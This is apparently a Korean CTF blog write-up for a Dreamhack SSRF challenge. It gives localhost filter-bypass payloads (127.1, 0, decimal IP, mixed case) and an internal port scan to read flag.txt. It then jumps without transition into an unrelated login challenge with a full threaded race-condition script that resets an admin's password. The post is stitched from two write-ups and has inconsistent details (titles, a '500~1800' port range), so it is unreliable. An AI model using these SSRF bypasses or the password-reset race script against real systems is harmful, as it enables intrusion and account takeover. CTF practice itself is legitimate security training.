---
title: "Web-ssrf / tier 2"
summary: "dreamhack"
date: "2026-04-10"
category: "ctf"
section: "security"
badge: "Wargame"
badgeTone: "ctf"
ctfGroup: "wargame"
tags:
  - wargame
  - web
statLabel: "tier"
statValue: "2"
heroEyebrow: "$ cat content/posts/login1-tier-2.md"
heroAvatar: "CTF"
---


## 문제 개요

- 챌린지 유형: Web, ssrf
- 목표:  SSRF 취약점 이용해 플래그 획득하는 문제 

## 분석 과정
```python
#!/usr/bin/python3
from flask import (
    Flask,
    request,
    render_template
)
import http.server
import threading
import requests
import os, random, base64
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()  # Flag is here!!
except:
    FLAG = "[**FLAG**]"


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)


local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```
- 이미지 뷰어 기능( /img_viewer):
    - 사용자가 제출한 `url` 값을 받아 `requests.get(url)`로 해당 주소의 데이터를 가져옴
    - 가져온 데이터는 base64로 인코딩하여 이미지로 보여줌
- 플래그는 서버 내부 디렉토리에 존재하지만 직접 외부로 보여주는 경로가 없기 때문에 외부에서 볼 수 있는 방법이 없음
```javascript
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
```
- 500~1800번 사이 중 무작위로 골라 포트 번호로 저장 하여 별도의 내부 HTTP 서버를 실행 함
- `SimpleHTTPRequestHandler` 해당 핸들러는 현재 디렉토리의 파일들을 웹 브라우저에 그대로 보여주는 기능을 함
- 즉, 서버 내부에서만 접속 가능한 경로가 생성된 상태
```text
💡이미지 뷰어 기능을 통해 내부 주소 http://127.0.0.1:[1500~1800]/flag.txt의 내용을 가져오도록 요청 보내면 서버 내부에서 로컬 서버로 접속하여 flag.txt 내용을 얻을 수 있음
```
- 하지만, 블랙리스트 사용하여 url에 localhost or 127.0.0.1 포함 시 필터링 됨
```javascript
elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
```
- 필터링 우회 기법 사용
    - 숏컷 IP : reguests라이브러리는 수자가 생략된 IP 자동 완성함
        - http://127.1 ⇒ 127.0.0.1로 인식
        - http://0 ⇒ 리눅스 환경 등 로컬 호스트를 가리키는 가장 짧은 주소
    - 16진수 및 정수형 IP : IP주소를 다른 진법으로 표현
        - 정수형(Decimal) 2130706433 ( 127.0.0.1 )
    - 대소문자 섞기 : `Localhost`
- 1500~1800 사이의 어떤 포트를 사용했는지 알아보기 위해 Burp Suite의 Intruder 기능 사용하여 스캔
![step1](/images/web-ssrf1.png)
![step1](/images/web-ssrf2.png)
- 스캔 결과 1545 포트에서 다른 포트와는 다른 Length 값을 갖고있음
- 닫힘 포트는 에러 이미지 반환하므로 결과값 길이가 대부분 일정 열림 포트는 내부 서버 메인 페이지 가져오므로 다른 길이를 가짐
- 따라서 1545 포트가 열려있음을 알 수 있음
- http://Localhost:1545/flag.txt 를 url에 입력하면 이미지가 base64 인코딩 되어 나옴
![step1](/images/web-ssrf3.png)
- 디코딩 하여 플래그 획득

- admin 권한을 가진 user 계정 찾기
```python
@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";
```
![step1](/images/login1-2.png)
- Apple 계정의 UserLevel이 1(admin) 인것을 확인
- 해당 계정에 백업코드(0~99)설정해 100개의 요청을 동시에 보내는 페이로드 작성

```python
import requests
import threading

TARGET_URL = "http://host3.dreamhack.games:19336/forgot_password" # 타겟 URL로 변경
TARGET_USERID = "Apple" # 식별한 관리자 ID
NEW_PASSWORD = "123"

def send_reset_request(backup_code):
    data = {
        "userid": TARGET_USERID,
        "newpassword": NEW_PASSWORD,
        "backupCode": backup_code
    }
    try:
        # 응답을 기다리지 않고 일단 던지는 것이 중요합니다.
        requests.post(TARGET_URL, data=data)
        print(f"[*] 요청 전송 완료 - backupCode: {backup_code}")
    except Exception as e:
        pass

def exploit():
    threads = []
    print("[*] Race Condition 공격 시작...")
    
    # 0부터 99까지의 백업 코드를 가진 100개의 스레드 생성
    for code in range(100):
        t = threading.Thread(target=send_reset_request, args=(code,))
        threads.append(t)
        
    # 모든 스레드를 일제히 시작 (거의 동시에 100개의 요청이 날아감)
    for t in threads:
        t.start()
        
    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
        t.join()
        
    print("\n[+] 공격 완료! 타겟 계정으로 로그인을 시도해 보세요.")

if __name__ == "__main__":
    exploit() # 주석 해제 후 실행
    pass
```
- 해당 코드 실행 시 Apple 계정의 비밀번호가 123로 변경 
![step1](/images/login1-3.png)
- admin 엔드포인트 접근 가능 
